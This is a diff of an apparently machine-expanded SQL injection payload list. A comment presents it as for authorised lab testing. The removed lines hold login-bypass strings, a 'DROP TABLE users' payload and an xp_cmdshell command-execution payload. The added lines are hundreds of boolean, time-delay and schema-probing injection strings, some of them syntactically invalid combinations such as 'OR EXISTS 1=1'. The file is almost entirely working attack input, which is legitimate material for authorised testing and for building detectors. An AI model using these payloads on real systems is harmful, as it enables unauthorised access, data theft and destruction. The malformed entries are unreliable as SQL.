@@ -1,631 +1,4313 @@
-' OR '1'='1--
-' OR '1'='1-- -
-' OR '1'='1#
-' OR '1'='1/*
-' OR '1'='1;%00
-' OR '1'='1--%20
-' OR '1'='1--+
-' OR '1'='1--|
-' OR '1'='1--/**/
+-- SQL Injection Payloads (expanded untuk ribuan varian)
+-- Hanya digunakan dalam lab atau test yang jelas izinnya.
+
 ' OR 1=1--
 ' OR 1=1-- -
 ' OR 1=1#
-' OR 1=1/*
 ' OR 1=1;%00
-' OR 1=1--%20
-' OR 1=1--+
-' OR 1=1--|
-' OR 1=1--/**/
-' OR '1'='1' ----
-' OR '1'='1' ---- -
-' OR '1'='1' --#
-' OR '1'='1' --/*
-' OR '1'='1' --;%00
-' OR '1'='1' ----%20
-' OR '1'='1' ----+
-' OR '1'='1' ----|
-' OR '1'='1' ----/**/
-" OR "1"="1"--
-" OR "1"="1"-- -
-" OR "1"="1"#
-" OR "1"="1"/*
-" OR "1"="1";%00
-" OR "1"="1"--%20
-" OR "1"="1"--+
-" OR "1"="1"--|
-" OR "1"="1"--/**/
-') OR ('1'='1--
-') OR ('1'='1-- -
-') OR ('1'='1#
-') OR ('1'='1/*
-') OR ('1'='1;%00
-') OR ('1'='1--%20
-') OR ('1'='1--+
-') OR ('1'='1--|
-') OR ('1'='1--/**/
-') OR 1=1----
-') OR 1=1---- -
-') OR 1=1--#
-') OR 1=1--/*
-') OR 1=1--;%00
-') OR 1=1----%20
-') OR 1=1----+
-') OR 1=1----|
-') OR 1=1----/**/
-admin' OR '1'='1--
-admin' OR '1'='1-- -
-admin' OR '1'='1#
-admin' OR '1'='1/*
-admin' OR '1'='1;%00
-admin' OR '1'='1--%20
-admin' OR '1'='1--+
-admin' OR '1'='1--|
-admin' OR '1'='1--/**/
-' OR 'a'='a--
-' OR 'a'='a-- -
-' OR 'a'='a#
-' OR 'a'='a/*
-' OR 'a'='a;%00
-' OR 'a'='a--%20
-' OR 'a'='a--+
-' OR 'a'='a--|
-' OR 'a'='a--/**/
-' OR 1=1 LIMIT 1----
-' OR 1=1 LIMIT 1---- -
-' OR 1=1 LIMIT 1--#
-' OR 1=1 LIMIT 1--/*
-' OR 1=1 LIMIT 1--;%00
-' OR 1=1 LIMIT 1----%20
-' OR 1=1 LIMIT 1----+
-' OR 1=1 LIMIT 1----|
-' OR 1=1 LIMIT 1----/**/
-' OR 1=1 UNION SELECT 1----
-' OR 1=1 UNION SELECT 1---- -
-' OR 1=1 UNION SELECT 1--#
-' OR 1=1 UNION SELECT 1--/*
-' OR 1=1 UNION SELECT 1--;%00
-' OR 1=1 UNION SELECT 1----%20
-' OR 1=1 UNION SELECT 1----+
-' OR 1=1 UNION SELECT 1----|
-' OR 1=1 UNION SELECT 1----/**/
-' OR 2>1--
-' OR 2>1-- -
-' OR 2>1#
-' OR 2>1/*
-' OR 2>1;%00
-' OR 2>1--%20
-' OR 2>1--+
-' OR 2>1--|
-' OR 2>1--/**/
-' OR 'x'='x--
-' OR 'x'='x-- -
-' OR 'x'='x#
-' OR 'x'='x/*
-' OR 'x'='x;%00
-' OR 'x'='x--%20
-' OR 'x'='x--+
-' OR 'x'='x--|
-' OR 'x'='x--/**/
-' OR 'x' LIKE 'x--
-' OR 'x' LIKE 'x-- -
-' OR 'x' LIKE 'x#
-' OR 'x' LIKE 'x/*
-' OR 'x' LIKE 'x;%00
-' OR 'x' LIKE 'x--%20
-' OR 'x' LIKE 'x--+
-' OR 'x' LIKE 'x--|
-' OR 'x' LIKE 'x--/**/
-'|| '1'='1--
-'|| '1'='1-- -
-'|| '1'='1#
-'|| '1'='1/*
-'|| '1'='1;%00
-'|| '1'='1--%20
-'|| '1'='1--+
-'|| '1'='1--|
-'|| '1'='1--/**/
-' OR 'text'>'t--
-' OR 'text'>'t-- -
-' OR 'text'>'t#
-' OR 'text'>'t/*
-' OR 'text'>'t;%00
-' OR 'text'>'t--%20
-' OR 'text'>'t--+
-' OR 'text'>'t--|
-' OR 'text'>'t--/**/
-username=admin'--
-username=admin' OR '1'='1
-user=admin' OR 1=1--
-u=admin') OR ('1'='1
-email=admin@example.com' OR '1'='1--
-login=admin' OR '1'='1/*
-user=admin' OR '1'='1'#
-user=admin')--
-id=1 OR 1=1
-id=1 OR 1=1--
-id=-1 UNION SELECT 1,2,3
-id=0 OR '1'='1
-id=1e309 OR 1=1
-id=1; DROP TABLE users;--
-id=1; EXEC xp_cmdshell('whoami');--
-product=1 WAITFOR DELAY '0:0:5'
-cat=1;SELECT pg_sleep(5);
-item=1 AND SLEEP(5)
-uid=1 OR SLEEP(5)--
-page=1 OR BENCHMARK(5000000,MD5(1))
-n=1 AND 1=CONVERT(INT,DB_NAME())
-qty=1 UNION SELECT NULL,NULL
-ref=1;SELECT dbms_pipe.receive_message('x',5) FROM dual
-row=1 AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64
-id=1 OR ASCII(SUBSTRING(user(),1,1))>64
+' OR 1=1/*
+' OR 1=1/**/
+' OR 1=1
+' OR 1=2--
+' OR 1=2-- -
+' OR 1=2#
+' OR 1=2;%00
+' OR 1=2/*
+' OR 1=2/**/
+' OR 1=2
+' OR 'a'='a'--
+' OR 'a'='a'-- -
+' OR 'a'='a'#
+' OR 'a'='a';%00
+' OR 'a'='a'/*
+' OR 'a'='a'/**/
+' OR 'a'='a'
+' OR 'x'='y'--
+' OR 'x'='y'-- -
+' OR 'x'='y'#
+' OR 'x'='y';%00
+' OR 'x'='y'/*
+' OR 'x'='y'/**/
+' OR 'x'='y'
+' OR user()=user()--
+' OR user()=user()-- -
+' OR user()=user()#
+' OR user()=user();%00
+' OR user()=user()/*
+' OR user()=user()/**/
+' OR user()=user()
+' OR version()=version()--
+' OR version()=version()-- -
+' OR version()=version()#
+' OR version()=version();%00
+' OR version()=version()/*
+' OR version()=version()/**/
+' OR version()=version()
+' OR DATABASE()=DATABASE()--
+' OR DATABASE()=DATABASE()-- -
+' OR DATABASE()=DATABASE()#
+' OR DATABASE()=DATABASE();%00
+' OR DATABASE()=DATABASE()/*
+' OR DATABASE()=DATABASE()/**/
+' OR DATABASE()=DATABASE()
+' OR (SELECT COUNT(*) FROM users)>0--
+' OR (SELECT COUNT(*) FROM users)>0-- -
+' OR (SELECT COUNT(*) FROM users)>0#
+' OR (SELECT COUNT(*) FROM users)>0;%00
+' OR (SELECT COUNT(*) FROM users)>0/*
+' OR (SELECT COUNT(*) FROM users)>0/**/
+' OR (SELECT COUNT(*) FROM users)>0
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR SLEEP(2)--
+' OR SLEEP(2)-- -
+' OR SLEEP(2)#
+' OR SLEEP(2);%00
+' OR SLEEP(2)/*
+' OR SLEEP(2)/**/
+' OR SLEEP(2)
+' OR SLEEP(5)--
+' OR SLEEP(5)-- -
+' OR SLEEP(5)#
+' OR SLEEP(5);%00
+' OR SLEEP(5)/*
+' OR SLEEP(5)/**/
+' OR SLEEP(5)
+' OR BENCHMARK(100000,MD5(1))--
+' OR BENCHMARK(100000,MD5(1))-- -
+' OR BENCHMARK(100000,MD5(1))#
+' OR BENCHMARK(100000,MD5(1));%00
+' OR BENCHMARK(100000,MD5(1))/*
+' OR BENCHMARK(100000,MD5(1))/**/
+' OR BENCHMARK(100000,MD5(1))
+' OR pg_sleep(2)--
+' OR pg_sleep(2)-- -
+' OR pg_sleep(2)#
+' OR pg_sleep(2);%00
+' OR pg_sleep(2)/*
+' OR pg_sleep(2)/**/
+' OR pg_sleep(2)
+' OR pg_sleep(5)--
+' OR pg_sleep(5)-- -
+' OR pg_sleep(5)#
+' OR pg_sleep(5);%00
+' OR pg_sleep(5)/*
+' OR pg_sleep(5)/**/
+' OR pg_sleep(5)
+' OR EXISTS(SELECT * FROM information_schema.tables)--
+' OR EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR EXISTS(SELECT * FROM information_schema.tables)#
+' OR EXISTS(SELECT * FROM information_schema.tables);%00
+' OR EXISTS(SELECT * FROM information_schema.tables)/*
+' OR EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR EXISTS(SELECT * FROM information_schema.tables)
+' AND 1=1--
+' AND 1=1-- -
+' AND 1=1#
+' AND 1=1;%00
+' AND 1=1/*
+' AND 1=1/**/
+' AND 1=1
+' AND 1=2--
+' AND 1=2-- -
+' AND 1=2#
+' AND 1=2;%00
+' AND 1=2/*
+' AND 1=2/**/
+' AND 1=2
+' AND 'a'='a'--
+' AND 'a'='a'-- -
+' AND 'a'='a'#
+' AND 'a'='a';%00
+' AND 'a'='a'/*
+' AND 'a'='a'/**/
+' AND 'a'='a'
+' AND 'x'='y'--
+' AND 'x'='y'-- -
+' AND 'x'='y'#
+' AND 'x'='y';%00
+' AND 'x'='y'/*
+' AND 'x'='y'/**/
+' AND 'x'='y'
+' AND user()=user()--
+' AND user()=user()-- -
+' AND user()=user()#
+' AND user()=user();%00
+' AND user()=user()/*
+' AND user()=user()/**/
+' AND user()=user()
+' AND version()=version()--
+' AND version()=version()-- -
+' AND version()=version()#
+' AND version()=version();%00
+' AND version()=version()/*
+' AND version()=version()/**/
+' AND version()=version()
+' AND DATABASE()=DATABASE()--
+' AND DATABASE()=DATABASE()-- -
+' AND DATABASE()=DATABASE()#
+' AND DATABASE()=DATABASE();%00
+' AND DATABASE()=DATABASE()/*
+' AND DATABASE()=DATABASE()/**/
+' AND DATABASE()=DATABASE()
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM users)>0-- -
+' AND (SELECT COUNT(*) FROM users)>0#
+' AND (SELECT COUNT(*) FROM users)>0;%00
+' AND (SELECT COUNT(*) FROM users)>0/*
+' AND (SELECT COUNT(*) FROM users)>0/**/
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' AND SLEEP(2)--
+' AND SLEEP(2)-- -
+' AND SLEEP(2)#
+' AND SLEEP(2);%00
+' AND SLEEP(2)/*
+' AND SLEEP(2)/**/
+' AND SLEEP(2)
+' AND SLEEP(5)--
+' AND SLEEP(5)-- -
+' AND SLEEP(5)#
+' AND SLEEP(5);%00
+' AND SLEEP(5)/*
+' AND SLEEP(5)/**/
+' AND SLEEP(5)
+' AND BENCHMARK(100000,MD5(1))--
+' AND BENCHMARK(100000,MD5(1))-- -
+' AND BENCHMARK(100000,MD5(1))#
+' AND BENCHMARK(100000,MD5(1));%00
+' AND BENCHMARK(100000,MD5(1))/*
+' AND BENCHMARK(100000,MD5(1))/**/
+' AND BENCHMARK(100000,MD5(1))
+' AND pg_sleep(2)--
+' AND pg_sleep(2)-- -
+' AND pg_sleep(2)#
+' AND pg_sleep(2);%00
+' AND pg_sleep(2)/*
+' AND pg_sleep(2)/**/
+' AND pg_sleep(2)
+' AND pg_sleep(5)--
+' AND pg_sleep(5)-- -
+' AND pg_sleep(5)#
+' AND pg_sleep(5);%00
+' AND pg_sleep(5)/*
+' AND pg_sleep(5)/**/
+' AND pg_sleep(5)
+' AND EXISTS(SELECT * FROM information_schema.tables)--
+' AND EXISTS(SELECT * FROM information_schema.tables)-- -
+' AND EXISTS(SELECT * FROM information_schema.tables)#
+' AND EXISTS(SELECT * FROM information_schema.tables);%00
+' AND EXISTS(SELECT * FROM information_schema.tables)/*
+' AND EXISTS(SELECT * FROM information_schema.tables)/**/
+' AND EXISTS(SELECT * FROM information_schema.tables)
+' OR NOT 1=1--
+' OR NOT 1=1-- -
+' OR NOT 1=1#
+' OR NOT 1=1;%00
+' OR NOT 1=1/*
+' OR NOT 1=1/**/
+' OR NOT 1=1
+' OR NOT 1=2--
+' OR NOT 1=2-- -
+' OR NOT 1=2#
+' OR NOT 1=2;%00
+' OR NOT 1=2/*
+' OR NOT 1=2/**/
+' OR NOT 1=2
+' OR NOT 'a'='a'--
+' OR NOT 'a'='a'-- -
+' OR NOT 'a'='a'#
+' OR NOT 'a'='a';%00
+' OR NOT 'a'='a'/*
+' OR NOT 'a'='a'/**/
+' OR NOT 'a'='a'
+' OR NOT 'x'='y'--
+' OR NOT 'x'='y'-- -
+' OR NOT 'x'='y'#
+' OR NOT 'x'='y';%00
+' OR NOT 'x'='y'/*
+' OR NOT 'x'='y'/**/
+' OR NOT 'x'='y'
+' OR NOT user()=user()--
+' OR NOT user()=user()-- -
+' OR NOT user()=user()#
+' OR NOT user()=user();%00
+' OR NOT user()=user()/*
+' OR NOT user()=user()/**/
+' OR NOT user()=user()
+' OR NOT version()=version()--
+' OR NOT version()=version()-- -
+' OR NOT version()=version()#
+' OR NOT version()=version();%00
+' OR NOT version()=version()/*
+' OR NOT version()=version()/**/
+' OR NOT version()=version()
+' OR NOT DATABASE()=DATABASE()--
+' OR NOT DATABASE()=DATABASE()-- -
+' OR NOT DATABASE()=DATABASE()#
+' OR NOT DATABASE()=DATABASE();%00
+' OR NOT DATABASE()=DATABASE()/*
+' OR NOT DATABASE()=DATABASE()/**/
+' OR NOT DATABASE()=DATABASE()
+' OR NOT (SELECT COUNT(*) FROM users)>0--
+' OR NOT (SELECT COUNT(*) FROM users)>0-- -
+' OR NOT (SELECT COUNT(*) FROM users)>0#
+' OR NOT (SELECT COUNT(*) FROM users)>0;%00
+' OR NOT (SELECT COUNT(*) FROM users)>0/*
+' OR NOT (SELECT COUNT(*) FROM users)>0/**/
+' OR NOT (SELECT COUNT(*) FROM users)>0
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR NOT SLEEP(2)--
+' OR NOT SLEEP(2)-- -
+' OR NOT SLEEP(2)#
+' OR NOT SLEEP(2);%00
+' OR NOT SLEEP(2)/*
+' OR NOT SLEEP(2)/**/
+' OR NOT SLEEP(2)
+' OR NOT SLEEP(5)--
+' OR NOT SLEEP(5)-- -
+' OR NOT SLEEP(5)#
+' OR NOT SLEEP(5);%00
+' OR NOT SLEEP(5)/*
+' OR NOT SLEEP(5)/**/
+' OR NOT SLEEP(5)
+' OR NOT BENCHMARK(100000,MD5(1))--
+' OR NOT BENCHMARK(100000,MD5(1))-- -
+' OR NOT BENCHMARK(100000,MD5(1))#
+' OR NOT BENCHMARK(100000,MD5(1));%00
+' OR NOT BENCHMARK(100000,MD5(1))/*
+' OR NOT BENCHMARK(100000,MD5(1))/**/
+' OR NOT BENCHMARK(100000,MD5(1))
+' OR NOT pg_sleep(2)--
+' OR NOT pg_sleep(2)-- -
+' OR NOT pg_sleep(2)#
+' OR NOT pg_sleep(2);%00
+' OR NOT pg_sleep(2)/*
+' OR NOT pg_sleep(2)/**/
+' OR NOT pg_sleep(2)
+' OR NOT pg_sleep(5)--
+' OR NOT pg_sleep(5)-- -
+' OR NOT pg_sleep(5)#
+' OR NOT pg_sleep(5);%00
+' OR NOT pg_sleep(5)/*
+' OR NOT pg_sleep(5)/**/
+' OR NOT pg_sleep(5)
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+' OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR NOT EXISTS(SELECT * FROM information_schema.tables)
+' AND NOT 1=1--
+' AND NOT 1=1-- -
+' AND NOT 1=1#
+' AND NOT 1=1;%00
+' AND NOT 1=1/*
+' AND NOT 1=1/**/
+' AND NOT 1=1
+' AND NOT 1=2--
+' AND NOT 1=2-- -
+' AND NOT 1=2#
+' AND NOT 1=2;%00
+' AND NOT 1=2/*
+' AND NOT 1=2/**/
+' AND NOT 1=2
+' AND NOT 'a'='a'--
+' AND NOT 'a'='a'-- -
+' AND NOT 'a'='a'#
+' AND NOT 'a'='a';%00
+' AND NOT 'a'='a'/*
+' AND NOT 'a'='a'/**/
+' AND NOT 'a'='a'
+' AND NOT 'x'='y'--
+' AND NOT 'x'='y'-- -
+' AND NOT 'x'='y'#
+' AND NOT 'x'='y';%00
+' AND NOT 'x'='y'/*
+' AND NOT 'x'='y'/**/
+' AND NOT 'x'='y'
+' AND NOT user()=user()--
+' AND NOT user()=user()-- -
+' AND NOT user()=user()#
+' AND NOT user()=user();%00
+' AND NOT user()=user()/*
+' AND NOT user()=user()/**/
+' AND NOT user()=user()
+' AND NOT version()=version()--
+' AND NOT version()=version()-- -
+' AND NOT version()=version()#
+' AND NOT version()=version();%00
+' AND NOT version()=version()/*
+' AND NOT version()=version()/**/
+' AND NOT version()=version()
+' AND NOT DATABASE()=DATABASE()--
+' AND NOT DATABASE()=DATABASE()-- -
+' AND NOT DATABASE()=DATABASE()#
+' AND NOT DATABASE()=DATABASE();%00
+' AND NOT DATABASE()=DATABASE()/*
+' AND NOT DATABASE()=DATABASE()/**/
+' AND NOT DATABASE()=DATABASE()
+' AND NOT (SELECT COUNT(*) FROM users)>0--
+' AND NOT (SELECT COUNT(*) FROM users)>0-- -
+' AND NOT (SELECT COUNT(*) FROM users)>0#
+' AND NOT (SELECT COUNT(*) FROM users)>0;%00
+' AND NOT (SELECT COUNT(*) FROM users)>0/*
+' AND NOT (SELECT COUNT(*) FROM users)>0/**/
+' AND NOT (SELECT COUNT(*) FROM users)>0
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' AND NOT SLEEP(2)--
+' AND NOT SLEEP(2)-- -
+' AND NOT SLEEP(2)#
+' AND NOT SLEEP(2);%00
+' AND NOT SLEEP(2)/*
+' AND NOT SLEEP(2)/**/
+' AND NOT SLEEP(2)
+' AND NOT SLEEP(5)--
+' AND NOT SLEEP(5)-- -
+' AND NOT SLEEP(5)#
+' AND NOT SLEEP(5);%00
+' AND NOT SLEEP(5)/*
+' AND NOT SLEEP(5)/**/
+' AND NOT SLEEP(5)
+' AND NOT BENCHMARK(100000,MD5(1))--
+' AND NOT BENCHMARK(100000,MD5(1))-- -
+' AND NOT BENCHMARK(100000,MD5(1))#
+' AND NOT BENCHMARK(100000,MD5(1));%00
+' AND NOT BENCHMARK(100000,MD5(1))/*
+' AND NOT BENCHMARK(100000,MD5(1))/**/
+' AND NOT BENCHMARK(100000,MD5(1))
+' AND NOT pg_sleep(2)--
+' AND NOT pg_sleep(2)-- -
+' AND NOT pg_sleep(2)#
+' AND NOT pg_sleep(2);%00
+' AND NOT pg_sleep(2)/*
+' AND NOT pg_sleep(2)/**/
+' AND NOT pg_sleep(2)
+' AND NOT pg_sleep(5)--
+' AND NOT pg_sleep(5)-- -
+' AND NOT pg_sleep(5)#
+' AND NOT pg_sleep(5);%00
+' AND NOT pg_sleep(5)/*
+' AND NOT pg_sleep(5)/**/
+' AND NOT pg_sleep(5)
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+' AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+' AND NOT EXISTS(SELECT * FROM information_schema.tables)
+' OR EXISTS 1=1--
+' OR EXISTS 1=1-- -
+' OR EXISTS 1=1#
+' OR EXISTS 1=1;%00
+' OR EXISTS 1=1/*
+' OR EXISTS 1=1/**/
+' OR EXISTS 1=1
+' OR EXISTS 1=2--
+' OR EXISTS 1=2-- -
+' OR EXISTS 1=2#
+' OR EXISTS 1=2;%00
+' OR EXISTS 1=2/*
+' OR EXISTS 1=2/**/
+' OR EXISTS 1=2
+' OR EXISTS 'a'='a'--
+' OR EXISTS 'a'='a'-- -
+' OR EXISTS 'a'='a'#
+' OR EXISTS 'a'='a';%00
+' OR EXISTS 'a'='a'/*
+' OR EXISTS 'a'='a'/**/
+' OR EXISTS 'a'='a'
+' OR EXISTS 'x'='y'--
+' OR EXISTS 'x'='y'-- -
+' OR EXISTS 'x'='y'#
+' OR EXISTS 'x'='y';%00
+' OR EXISTS 'x'='y'/*
+' OR EXISTS 'x'='y'/**/
+' OR EXISTS 'x'='y'
+' OR EXISTS user()=user()--
+' OR EXISTS user()=user()-- -
+' OR EXISTS user()=user()#
+' OR EXISTS user()=user();%00
+' OR EXISTS user()=user()/*
+' OR EXISTS user()=user()/**/
+' OR EXISTS user()=user()
+' OR EXISTS version()=version()--
+' OR EXISTS version()=version()-- -
+' OR EXISTS version()=version()#
+' OR EXISTS version()=version();%00
+' OR EXISTS version()=version()/*
+' OR EXISTS version()=version()/**/
+' OR EXISTS version()=version()
+' OR EXISTS DATABASE()=DATABASE()--
+' OR EXISTS DATABASE()=DATABASE()-- -
+' OR EXISTS DATABASE()=DATABASE()#
+' OR EXISTS DATABASE()=DATABASE();%00
+' OR EXISTS DATABASE()=DATABASE()/*
+' OR EXISTS DATABASE()=DATABASE()/**/
+' OR EXISTS DATABASE()=DATABASE()
+' OR EXISTS (SELECT COUNT(*) FROM users)>0--
+' OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+' OR EXISTS (SELECT COUNT(*) FROM users)>0#
+' OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+' OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+' OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+' OR EXISTS (SELECT COUNT(*) FROM users)>0
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR EXISTS SLEEP(2)--
+' OR EXISTS SLEEP(2)-- -
+' OR EXISTS SLEEP(2)#
+' OR EXISTS SLEEP(2);%00
+' OR EXISTS SLEEP(2)/*
+' OR EXISTS SLEEP(2)/**/
+' OR EXISTS SLEEP(2)
+' OR EXISTS SLEEP(5)--
+' OR EXISTS SLEEP(5)-- -
+' OR EXISTS SLEEP(5)#
+' OR EXISTS SLEEP(5);%00
+' OR EXISTS SLEEP(5)/*
+' OR EXISTS SLEEP(5)/**/
+' OR EXISTS SLEEP(5)
+' OR EXISTS BENCHMARK(100000,MD5(1))--
+' OR EXISTS BENCHMARK(100000,MD5(1))-- -
+' OR EXISTS BENCHMARK(100000,MD5(1))#
+' OR EXISTS BENCHMARK(100000,MD5(1));%00
+' OR EXISTS BENCHMARK(100000,MD5(1))/*
+' OR EXISTS BENCHMARK(100000,MD5(1))/**/
+' OR EXISTS BENCHMARK(100000,MD5(1))
+' OR EXISTS pg_sleep(2)--
+' OR EXISTS pg_sleep(2)-- -
+' OR EXISTS pg_sleep(2)#
+' OR EXISTS pg_sleep(2);%00
+' OR EXISTS pg_sleep(2)/*
+' OR EXISTS pg_sleep(2)/**/
+' OR EXISTS pg_sleep(2)
+' OR EXISTS pg_sleep(5)--
+' OR EXISTS pg_sleep(5)-- -
+' OR EXISTS pg_sleep(5)#
+' OR EXISTS pg_sleep(5);%00
+' OR EXISTS pg_sleep(5)/*
+' OR EXISTS pg_sleep(5)/**/
+' OR EXISTS pg_sleep(5)
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+' AND EXISTS 1=1--
+' AND EXISTS 1=1-- -
+' AND EXISTS 1=1#
+' AND EXISTS 1=1;%00
+' AND EXISTS 1=1/*
+' AND EXISTS 1=1/**/
+' AND EXISTS 1=1
+' AND EXISTS 1=2--
+' AND EXISTS 1=2-- -
+' AND EXISTS 1=2#
+' AND EXISTS 1=2;%00
+' AND EXISTS 1=2/*
+' AND EXISTS 1=2/**/
+' AND EXISTS 1=2
+' AND EXISTS 'a'='a'--
+' AND EXISTS 'a'='a'-- -
+' AND EXISTS 'a'='a'#
+' AND EXISTS 'a'='a';%00
+' AND EXISTS 'a'='a'/*
+' AND EXISTS 'a'='a'/**/
+' AND EXISTS 'a'='a'
+' AND EXISTS 'x'='y'--
+' AND EXISTS 'x'='y'-- -
+' AND EXISTS 'x'='y'#
+' AND EXISTS 'x'='y';%00
+' AND EXISTS 'x'='y'/*
+' AND EXISTS 'x'='y'/**/
+' AND EXISTS 'x'='y'
+' AND EXISTS user()=user()--
+' AND EXISTS user()=user()-- -
+' AND EXISTS user()=user()#
+' AND EXISTS user()=user();%00
+' AND EXISTS user()=user()/*
+' AND EXISTS user()=user()/**/
+' AND EXISTS user()=user()
+' AND EXISTS version()=version()--
+' AND EXISTS version()=version()-- -
+' AND EXISTS version()=version()#
+' AND EXISTS version()=version();%00
+' AND EXISTS version()=version()/*
+' AND EXISTS version()=version()/**/
+' AND EXISTS version()=version()
+' AND EXISTS DATABASE()=DATABASE()--
+' AND EXISTS DATABASE()=DATABASE()-- -
+' AND EXISTS DATABASE()=DATABASE()#
+' AND EXISTS DATABASE()=DATABASE();%00
+' AND EXISTS DATABASE()=DATABASE()/*
+' AND EXISTS DATABASE()=DATABASE()/**/
+' AND EXISTS DATABASE()=DATABASE()
+' AND EXISTS (SELECT COUNT(*) FROM users)>0--
+' AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+' AND EXISTS (SELECT COUNT(*) FROM users)>0#
+' AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+' AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+' AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+' AND EXISTS (SELECT COUNT(*) FROM users)>0
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' AND EXISTS SLEEP(2)--
+' AND EXISTS SLEEP(2)-- -
+' AND EXISTS SLEEP(2)#
+' AND EXISTS SLEEP(2);%00
+' AND EXISTS SLEEP(2)/*
+' AND EXISTS SLEEP(2)/**/
+' AND EXISTS SLEEP(2)
+' AND EXISTS SLEEP(5)--
+' AND EXISTS SLEEP(5)-- -
+' AND EXISTS SLEEP(5)#
+' AND EXISTS SLEEP(5);%00
+' AND EXISTS SLEEP(5)/*
+' AND EXISTS SLEEP(5)/**/
+' AND EXISTS SLEEP(5)
+' AND EXISTS BENCHMARK(100000,MD5(1))--
+' AND EXISTS BENCHMARK(100000,MD5(1))-- -
+' AND EXISTS BENCHMARK(100000,MD5(1))#
+' AND EXISTS BENCHMARK(100000,MD5(1));%00
+' AND EXISTS BENCHMARK(100000,MD5(1))/*
+' AND EXISTS BENCHMARK(100000,MD5(1))/**/
+' AND EXISTS BENCHMARK(100000,MD5(1))
+' AND EXISTS pg_sleep(2)--
+' AND EXISTS pg_sleep(2)-- -
+' AND EXISTS pg_sleep(2)#
+' AND EXISTS pg_sleep(2);%00
+' AND EXISTS pg_sleep(2)/*
+' AND EXISTS pg_sleep(2)/**/
+' AND EXISTS pg_sleep(2)
+' AND EXISTS pg_sleep(5)--
